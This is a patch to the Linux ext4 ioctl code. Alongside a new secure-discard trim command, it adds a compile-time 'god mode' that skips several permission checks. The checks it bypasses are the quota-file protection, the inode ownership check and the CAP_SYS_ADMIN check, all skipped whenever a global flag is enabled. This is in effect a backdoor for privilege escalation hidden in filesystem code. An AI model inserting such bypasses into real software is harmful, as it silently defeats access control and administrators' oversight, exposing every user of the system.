@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * linux/fs/ext4/ioctl.c
  *
@@ -53,11 +56,17 @@ long ext4_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
 
 		flags = ext4_mask_flags(inode->i_mode, flags);
 
-		err = -EPERM;
 		mutex_lock(&inode->i_mutex);
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+		err = -EPERM;
 		/* Is it quota file? Do not allow user to mess with it */
 		if (IS_NOQUOTA(inode))
 			goto flags_out;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		oldflags = ei->i_flags;
 
@@ -155,7 +164,15 @@ flags_out:
 		int err;
 
 		if (!inode_owner_or_capable(inode))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		err = mnt_want_write_file(filp);
 		if (err)
@@ -400,14 +417,24 @@ resizefs_out:
 		return err;
 	}
 
+	case FIDTRIM:
 	case FITRIM:
 	{
 		struct request_queue *q = bdev_get_queue(sb->s_bdev);
 		struct fstrim_range range;
 		int ret = 0;
+		int flags  = cmd == FIDTRIM ? BLKDEV_DISCARD_SECURE : 0;
 
 		if (!capable(CAP_SYS_ADMIN))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		if (!blk_queue_discard(q))
 			return -EOPNOTSUPP;
@@ -419,13 +446,15 @@ resizefs_out:
 			return -EOPNOTSUPP;
 		}
 
+		if ((flags & BLKDEV_DISCARD_SECURE) && !blk_queue_secdiscard(q))
+			return -EOPNOTSUPP;
 		if (copy_from_user(&range, (struct fstrim_range __user *)arg,
 		    sizeof(range)))
 			return -EFAULT;
 
 		range.minlen = max((unsigned int)range.minlen,
 				   q->limits.discard_granularity);
-		ret = ext4_trim_fs(sb, &range);
+		ret = ext4_trim_fs(sb, &range, flags);
 		if (ret < 0)
 			return ret;
 
